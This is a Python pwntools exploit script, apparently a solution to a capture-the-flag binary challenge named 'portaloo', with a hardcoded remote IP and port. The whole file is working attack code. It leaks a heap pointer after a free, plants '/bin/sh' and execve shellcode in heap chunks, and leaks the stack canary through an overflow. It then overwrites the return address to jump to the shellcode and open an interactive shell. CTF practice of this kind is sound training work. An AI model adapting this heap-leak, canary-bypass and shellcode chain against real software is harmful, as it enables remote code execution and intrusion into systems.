#!/usr/bin/env python3

from pwn import *
from re import match


exe = ELF("portaloo_patched")
libc = ELF("glibc/libc.so.6")
ld = ELF("glibc/ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("94.237.120.137", 39327)

    return r


def create_portal(idx: int):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Insert portal number: ", str(idx).encode("ascii"))


def destroy_portal(idx: int):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Insert portal number: ", str(idx).encode("ascii"))


def upgrade_portal(idx: int, data: bytes):
    assert len(data) <= 0x15
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"Insert portal number: ", str(idx).encode("ascii"))
    r.sendafter(b"Enter data: ", data)


def peek_into_the_void() -> bytes:
    r.sendlineafter(b"> ", b"4")
    return match(rb"Coordinate: \d+ ---- Data: (.+)", r.recvlines(2)[-1]).group(1)


def main():
    r = conn()

    # Create both portal
    create_portal(0)
    create_portal(1)

    # Leak heap
    destroy_portal(0)
    heap = u64(peek_into_the_void().ljust(8, b"\x00")) << 12
    log.info(f"heap: 0x{heap:x}")

    # Prepare the chunk to store the string "/bin/sh"
    # This will overwrite some important metadata but who cares since it won't be used anymore
    upgrade_portal(0, b"/bin/sh\x00")

    # Prepare shellcode (challenge makes portals also executable)
    shellcode = asm(f"""
        mov rdi, 0x{heap + 0x2a0:x};
        xor rsi, rsi;
        xor rdx, rdx;
        mov al, 0x3b;
        syscall;
    """)
    upgrade_portal(1, shellcode)

    # step_into_the_portal() ---> leak canary and return to heap afterward
    r.sendlineafter(b"> ", b"5")
    r.sendafter(b"with you?\n", b"A" * 0x48 + b"B");

    r.recvuntil(b"[!] ")
    canary = u64(b"\x00" + match(rb"Amazing option choosing (.+)", r.recvline()).group(1).strip(b"A")[1:8])
    log.info(f"canary: 0x{canary:x}")

    # Enjoy the shell!
    r.sendlineafter(b"Any last words: ", b"A" * 0x48 + p64(canary) + b"B" * 8 + p64(heap + 0x2d0));
    r.interactive("$ ")


if __name__ == "__main__":
    main()
